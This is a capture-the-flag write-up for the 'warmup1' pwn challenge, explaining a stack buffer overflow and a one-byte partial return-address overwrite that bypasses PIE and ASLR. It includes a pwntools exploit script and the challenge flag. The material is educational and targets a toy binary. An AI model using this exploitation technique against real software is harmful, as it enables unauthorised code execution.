# warmup1

## Challenge

The challenge is a small binary which reads a string from the user, then returns and exits.
The binary contains a `win` function which will print the flag if called.

PIE and ASLR are enabled, but there is no canary.

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Decompiled vuln function

```c
void sym.vuln(void) {
    ulong buf;
    
    sym.imp.read(0, &buf, 0x100);
    return;
}
```

## Solution

There is a buffer overflow in the `vuln` function, which reads 0x100 bytes into a 0x10-byte buffer.
Recall that `read` does not append a null-byte to the end of our string.

The return address after `vuln` will be at 0x00001212 relative to the binary base.
The address of the `win` function is 0x00001219 relative to the binary base.

As these addresses differ only by the least significant byte, which is not affected by PIE and ASLR, we can use the buffer overflow to modify this byte to return to the `win` function.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337 chal
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chal')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.send(flat({0x18: b'\x19'}))

io.interactive()
```

## Flag

```
maple{buwuffer_owoverflow_UwU}
```
